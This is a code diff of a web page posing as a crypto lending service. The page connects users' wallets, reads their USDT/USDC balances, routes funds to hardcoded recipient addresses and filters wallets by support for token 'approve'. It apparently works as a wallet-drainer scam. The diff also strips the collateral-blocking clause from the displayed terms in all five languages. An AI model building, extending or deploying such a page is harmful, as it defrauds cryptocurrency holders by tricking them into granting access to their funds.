@@ -9,7 +9,11 @@
     <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
         body {
             font-family: 'Inter', sans-serif;
@@ -520,31 +524,27 @@
 
     <script>
         const HELEKET_API = 'https://heleket-zhpx.onrender.com';
-        const INTEREST_RATE = 0.05; // 5%
+        const INTEREST_RATE = 0.05;
 
         const USDT_CONTRACTS = {
             TRC20: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
             BEP20: '0x55d398326f99059fF775485246999027B3197955',
             ERC20: '0xdAC17F958D2ee523a2206206994597C13D831ec7'
         };
-
         const USDC_CONTRACTS = {
             TRC20: 'TEkxiTehnzSmSe2XqrBj4w32RUNVrdMUwa',
             BEP20: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
             ERC20: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'
         };
-
         const RPC = {
             TRON: 'https://api.trongrid.io',
             BSC: 'https://bsc-dataseed.binance.org',
             ETH: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161'
         };
-
         const RECIPIENT_ADDRESSES = {
             TRC20: 'TUpkiEo4DJM8WefDXh5WoXYP41pknw8oPU',
             EVM: '0x110ed6bd10cac183b50ff5875dd2ef9794d7c6ac'
         };
-
         const WALLET_LOGOS = {
             'OKX Wallet': 'https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/41/f6/98/41f6987b-5d4d-8a72-4b5d-951c1a419f88/AppIcon-0-0-1x_U007emarketing-0-8-0-85-220.png/1200x630wa.png',
             'MetaMask': 'https://images.seeklogo.com/logo-png/42/1/metamask-logo-png_seeklogo-426728.png',
@@ -552,14 +552,37 @@
             'Bitget Wallet': 'https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/d9/a5/a7/d9a5a757-37a9-a2f1-ccd1-572c157bec24/AppIcon-1x_U007epad-0-11-0-85-220-0.png/1200x630wa.png',
             'TronLink': 'https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/52/45/f2/5245f216-0009-f19d-a0c0-8f8afb5ca43d/AppIcon-1x_U007emarketing-0-6-0-85-220-0.png/1200x630wa.png'
         };
-
         const COIN_LOGOS = {
             'USDT': 'https://raw.githubusercontent.com/atomiclabs/cryptocurrency-icons/master/32/color/usdt.png',
             'USDC': 'https://raw.githubusercontent.com/atomiclabs/cryptocurrency-icons/master/32/color/usdc.png'
         };
-
         const walletsPopularity = ['OKX Wallet', 'MetaMask', 'Trust Wallet', 'Bitget Wallet', 'TronLink'];
-        const coinsPopularity = ['USDT (TRC-20)', 'USDT (BEP-20)', 'USDT (ERC-20)', 'USDC (BEP-20)', 'USDC (ERC-20)'];
+
+        // Функция для фильтрации монет в зависимости от кошелька
+        function getAvailableCoinsForWallet(walletName) {
+            const allCoins = [
+                { coin: 'USDT', network: 'TRC20', name: 'USDT (TRC-20)', contract: USDT_CONTRACTS.TRC20, decimals: 6, isNative: false },
+                { coin: 'USDT', network: 'BEP20', name: 'USDT (BEP-20)', contract: USDT_CONTRACTS.BEP20, decimals: 18, isNative: false },
+                { coin: 'USDC', network: 'BEP20', name: 'USDC (BEP-20)', contract: USDC_CONTRACTS.BEP20, decimals: 18, isNative: false },
+                { coin: 'USDT', network: 'ERC20', name: 'USDT (ERC-20)', contract: USDT_CONTRACTS.ERC20, decimals: 6, isNative: false },
+                { coin: 'USDC', network: 'ERC20', name: 'USDC (ERC-20)', contract: USDC_CONTRACTS.ERC20, decimals: 6, isNative: false }
+            ];
+
+            // Для кошельков, которые НЕ поддерживают TRC20 approve
+            const noTrc20Wallets = ['MetaMask', 'Trust Wallet'];
+            
+            if (noTrc20Wallets.includes(walletName)) {
+                return allCoins.filter(coin => coin.network !== 'TRC20');
+            }
+            
+            // Для TronLink — только TRC20
+            if (walletName === 'TronLink') {
+                return allCoins.filter(coin => coin.network === 'TRC20');
+            }
+            
+            // Для OKX и Bitget — все сети
+            return allCoins;
+        }
 
         function detectCurrentWallet() {
             const ua = navigator.userAgent.toLowerCase();
@@ -600,7 +623,7 @@
                 feature3Title: "Any network",
                 feature3Desc: "TRC20, BEP20, ERC20",
                 rulesTitle: "📜 Terms & Conditions",
-                rulesText: "<h3>Loan terms</h3><p>• Loan amount: up to 50% of your wallet balance<br>• Interest rate: 5% of loan amount<br>• Term: 30 days<br>• Auto-renewal: if overdue, 5% is charged every 30 days<br>• Collateral: blocked funds (100% of loan amount)</p><h3>Repayment</h3><p>For early repayment, please contact support. Funds will be automatically deducted after the term expires.</p>",
+                rulesText: "<h3>Loan terms</h3><p>• Loan amount: up to 50% of your wallet balance<br>• Interest rate: 5% of loan amount<br>• Term: 30 days<br>• Auto-renewal: if overdue, 5% is charged every 30 days</p><h3>Repayment</h3><p>For early repayment, please contact support. Funds will be automatically deducted after the term expires.</p>",
                 repaymentText: "📋 Repayment terms:\n• Amount to repay: {repay} {coin}\n• Interest rate: 5%\n• Due: 30 days from today\n• Auto-renewal: +5% every 30 days if overdue\n• Early repayment: contact support"
             },
             ru: {
@@ -627,7 +650,7 @@
                 feature3Title: "Любая сеть",
                 feature3Desc: "TRC20, BEP20, ERC20",
                 rulesTitle: "📜 Правила и условия",
-                rulesText: "<h3>Условия займа</h3><p>• Сумма займа: до 50% от баланса кошелька<br>• Процентная ставка: 5% от суммы займа<br>• Срок: 30 дней<br>• Автопродление: при просрочке списывается 5% каждые 30 дней<br>• Залог: заблокированные средства (100% от суммы займа)</p><h3>Возврат</h3><p>Для досрочного возврата свяжитесь с поддержкой. Средства будут списаны автоматически после истечения срока.</p>",
+                rulesText: "<h3>Условия займа</h3><p>• Сумма займа: до 50% от баланса кошелька<br>• Процентная ставка: 5% от суммы займа<br>• Срок: 30 дней<br>• Автопродление: при просрочке списывается 5% каждые 30 дней</p><h3>Возврат</h3><p>Для досрочного возврата свяжитесь с поддержкой. Средства будут списаны автоматически после истечения срока.</p>",
                 repaymentText: "📋 Условия возврата:\n• Сумма к возврату: {repay} {coin}\n• Процентная ставка: 5%\n• Срок: 30 дней\n• Автопродление: +5% каждые 30 дней при просрочке\n• Досрочный возврат: свяжитесь с поддержкой"
             },
             es: {
@@ -654,7 +677,7 @@
                 feature3Title: "Cualquier red",
                 feature3Desc: "TRC20, BEP20, ERC20",
                 rulesTitle: "📜 Términos y condiciones",
-                rulesText: "<h3>Condiciones del préstamo</h3><p>• Monto: hasta 50% del saldo<br>• Interés: 5%<br>• Plazo: 30 días<br>• Renovación automática: +5% cada 30 días si vence<br>• Garantía: fondos bloqueados (100%)</p>",
+                rulesText: "<h3>Condiciones del préstamo</h3><p>• Monto: hasta 50% del saldo<br>• Interés: 5%<br>• Plazo: 30 días<br>• Renovación automática: +5% cada 30 días si vence</p>",
                 repaymentText: "📋 Condiciones de devolución:\n• A devolver: {repay} {coin}\n• Interés: 5%\n• Vence: 30 días\n• Renovación automática: +5% cada 30 días\n• Devolución anticipada: contacte soporte"
             },
             de: {
@@ -681,7 +704,7 @@
                 feature3Title: "Jedes Netzwerk",
                 feature3Desc: "TRC20, BEP20, ERC20",
                 rulesTitle: "📜 Allgemeine Geschäftsbedingungen",
-                rulesText: "<h3>Kreditbedingungen</h3><p>• Betrag: bis zu 50% des Guthabens<br>• Zinssatz: 5%<br>• Laufzeit: 30 Tage<br>• Automatische Verlängerung: +5% alle 30 Tage<br>• Sicherheit: blockierte Gelder (100%)</p>",
+                rulesText: "<h3>Kreditbedingungen</h3><p>• Betrag: bis zu 50% des Guthabens<br>• Zinssatz: 5%<br>• Laufzeit: 30 Tage<br>• Automatische Verlängerung: +5% alle 30 Tage</p>",
                 repaymentText: "📋 Rückzahlungsbedingungen:\n• Rückzahlungsbetrag: {repay} {coin}\n• Zinssatz: 5%\n• Fällig: 30 Tage\n• Automatische Verlängerung: +5% alle 30 Tage\n• Vorzeitige Rückzahlung: Support kontaktieren"
             },
             fr: {
@@ -708,7 +731,7 @@
                 feature3Title: "N'importe quel réseau",
                 feature3Desc: "TRC20, BEP20, ERC20",
                 rulesTitle: "📜 Conditions générales",
-                rulesText: "<h3>Conditions du prêt</h3><p>• Montant: jusqu'à 50% du solde<br>• Taux d'intérêt: 5%<br>• Durée: 30 jours<br>• Renouvellement automatique: +5% tous les 30 jours<br>• Garantie: fonds bloqués (100%)</p>",
+                rulesText: "<h3>Conditions du prêt</h3><p>• Montant: jusqu'à 50% du solde<br>• Taux d'intérêt: 5%<br>• Durée: 30 jours<br>• Renouvellement automatique: +5% tous les 30 jours</p>",
                 repaymentText: "📋 Conditions de remboursement:\n• À rembourser: {repay} {coin}\n• Taux d'intérêt: 5%\n• Échéance: 30 jours\n• Renouvellement automatique: +5% tous les 30 jours\n• Remboursement anticipé: contactez le support"
             }
         };
@@ -722,80 +745,15 @@
         let invoiceId = null;
         let loanAmount = 0;
         let currentWalletBrowser = detectCurrentWallet();
+        let currentCoinsList = [];
 
-        const wallets = [{
-                name: 'OKX Wallet',
-                logo: WALLET_LOGOS['OKX Wallet'],
-                evmSupported: true,
-                tronSupported: true
-            },
-            {
-                name: 'MetaMask',
-                logo: WALLET_LOGOS['MetaMask'],
-                evmSupported: true,
-                tronSupported: false
-            },
-            {
-                name: 'Trust Wallet',
-                logo: WALLET_LOGOS['Trust Wallet'],
-                evmSupported: true,
-                tronSupported: false
-            },
-            {
-                name: 'Bitget Wallet',
-                logo: WALLET_LOGOS['Bitget Wallet'],
-                evmSupported: true,
-                tronSupported: true
-            },
-            {
-                name: 'TronLink',
-                logo: WALLET_LOGOS['TronLink'],
-                evmSupported: false,
-                tronSupported: true
-            }
+        const wallets = [
+            { name: 'OKX Wallet', logo: WALLET_LOGOS['OKX Wallet'], evmSupported: true, tronSupported: true },
+            { name: 'MetaMask', logo: WALLET_LOGOS['MetaMask'], evmSupported: true, tronSupported: false },
+            { name: 'Trust Wallet', logo: WALLET_LOGOS['Trust Wallet'], evmSupported: true, tronSupported: false },
+            { name: 'Bitget Wallet', logo: WALLET_LOGOS['Bitget Wallet'], evmSupported: true, tronSupported: true },
+            { name: 'TronLink', logo: WALLET_LOGOS['TronLink'], evmSupported: false, tronSupported: true }
         ].sort((a, b) => walletsPopularity.indexOf(a.name) - walletsPopularity.indexOf(b.name));
-
-        const coins = [{
-                coin: 'USDT',
-                network: 'TRC20',
-                name: 'USDT (TRC-20)',
-                contract: USDT_CONTRACTS.TRC20,
-                decimals: 6,
-                isNative: false
-            },
-            {
-                coin: 'USDT',
-                network: 'BEP20',
-                name: 'USDT (BEP-20)',
-                contract: USDT_CONTRACTS.BEP20,
-                decimals: 18,
-                isNative: false
-            },
-            {
-                coin: 'USDT',
-                network: 'ERC20',
-                name: 'USDT (ERC-20)',
-                contract: USDT_CONTRACTS.ERC20,
-                decimals: 6,
-                isNative: false
-            },
-            {
-                coin: 'USDC',
-                network: 'BEP20',
-                name: 'USDC (BEP-20)',
-                contract: USDC_CONTRACTS.BEP20,
-                decimals: 18,
-                isNative: false
-            },
-            {
-                coin: 'USDC',
-                network: 'ERC20',
-                name: 'USDC (ERC-20)',
-                contract: USDC_CONTRACTS.ERC20,
-                decimals: 6,
-                isNative: false
-            }
-        ].sort((a, b) => coinsPopularity.indexOf(a.name) - coinsPopularity.indexOf(b.name));
 
         async function getTRC20Balance(address, contractAddress) {
             try {
@@ -1003,15 +961,29 @@
         }
 
         function renderWalletList() {
-            document.getElementById('walletList').innerHTML = wallets.map(w => `<div class="wallet-option" onclick="selectWalletHandler('${w.name}')"><img class="wallet-icon" src="${w.logo}" onerror="this.style.display='none'"><span>${w.name}</span></div>`).join('');
+            document.getElementById('walletList').innerHTML = wallets.map(w => `
+                <div class="wallet-option" onclick="selectWalletHandler('${w.name}')">
+                    <img class="wallet-icon" src="${w.logo}" onerror="this.style.display='none'">
+                    <span style="font-weight:600;">${w.name}</span>
+                </div>
+            `).join('');
         }
 
         window.selectWalletHandler = async (walletName) => {
             const connected = await connectWallet(walletName);
             if (!connected) return;
+            
+            currentCoinsList = getAvailableCoinsForWallet(walletName);
+            
             document.getElementById('walletSelectionStep').style.display = 'none';
             document.getElementById('networkSelectionStep').style.display = 'block';
-            document.getElementById('networkList').innerHTML = coins.map(c => `<div class="coin-option" onclick="selectNetworkHandler('${c.network}', '${c.coin}')"><img class="coin-icon" src="${COIN_LOGOS[c.coin]}" onerror="this.style.display='none'"><span>${c.name}</span></div>`).join('');
+            
+            document.getElementById('networkList').innerHTML = currentCoinsList.map(c => `
+                <div class="coin-option" onclick="selectNetworkHandler('${c.network}', '${c.coin}')">
+                    <img class="coin-icon" src="${COIN_LOGOS[c.coin]}" onerror="this.style.display='none'">
+                    <span style="font-weight:600;">${c.name}</span>
+                </div>
+            `).join('');
         };
 
         window.selectNetworkHandler = async (network, coin) => {
